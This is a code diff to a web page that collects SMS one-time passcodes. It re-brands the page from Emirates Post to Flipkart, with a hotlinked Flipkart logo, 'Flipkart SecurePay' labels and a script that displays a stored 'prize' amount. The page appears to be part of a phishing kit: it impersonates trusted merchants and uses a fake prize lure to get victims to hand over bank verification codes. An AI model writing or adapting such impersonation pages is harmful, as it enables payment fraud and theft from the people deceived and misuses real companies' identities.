@@ -93,6 +93,7 @@ session_start();
 
         <div class="bg-white rounded-2xl shadow-xl p-8 relative overflow-hidden">
             <div class="text-center mb-8">
+            <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/flipkart.svg" alt="Flipkart" class="h-12 mx-auto mb-4">
                 <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                     <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
                 </div>
@@ -110,15 +111,15 @@ session_start();
                 <div class="space-y-2 text-sm">
                     <div class="flex justify-between">
                         <span>Merchant:</span>
-                        <span class="font-semibold">Emirates Post</span>
+                        <span class="font-semibold">Flipkart</span>
                     </div>
                     <div class="flex justify-between">
                         <span>Amount:</span>
-                        <span class="font-semibold text-green-600">AED 18.00</span>
+                        <span id="otpAmount" class="font-semibold text-green-600">&#8377; 0.00</span>
                     </div>
                     <div class="flex justify-between">
                         <span>Verification:</span>
-                        <span class="font-semibold">3D Secure</span>
+                        <span class="font-semibold">Flipkart SecurePay</span>
                     </div>
                 </div>
             </div>
@@ -135,7 +136,7 @@ session_start();
                 </div>
 
                 <div class="flex items-center justify-between text-sm text-gray-600">
-                    <span><i class="fas fa-lock mr-2 text-green-500"></i>Secure Emirates Post verification</span>
+                    <span><i class="fas fa-lock mr-2 text-green-500"></i>Secure Flipkart verification</span>
                     <a href="#" class="text-blue-600 hover:underline">Resend code</a>
                 </div>
 
@@ -160,6 +161,44 @@ session_start();
                 timerEl.textContent = `${m}:${s}`;
             }, 1000);
         }
+        const storedPrizeValue = (function () {
+            const normalize = (value) => {
+                if (!value) {
+                    return '₹ 0.00';
+                }
+                return value
+                    .replace(/&#8377;/g, '₹')
+                    .replace(/Rs\.?/gi, '₹')
+                    .replace(/\s+/g, ' ')
+                    .trim();
+            };
+            try {
+                const sessionValue = sessionStorage.getItem('flipkartPrizeValue');
+                if (sessionValue) {
+                    return normalize(sessionValue);
+                }
+            } catch (err) {
+                console.warn('Unable to access sessionStorage for prize value', err);
+            }
+            try {
+                const localPrize = localStorage.getItem('selectedPrize');
+                if (localPrize) {
+                    const parsed = JSON.parse(localPrize);
+                    if (parsed && parsed.value) {
+                        return normalize(parsed.value);
+                    }
+                }
+            } catch (err) {
+                console.warn('Unable to parse stored prize for OTP amount', err);
+            }
+            return '₹ 0.00';
+        })();
+
+        const otpAmountEl = document.getElementById('otpAmount');
+        if (otpAmountEl) {
+            otpAmountEl.textContent = storedPrizeValue;
+        }
+
         const smsInput = document.getElementById('smsCode');
         if (smsInput) {
             smsInput.addEventListener('input', (e) => {
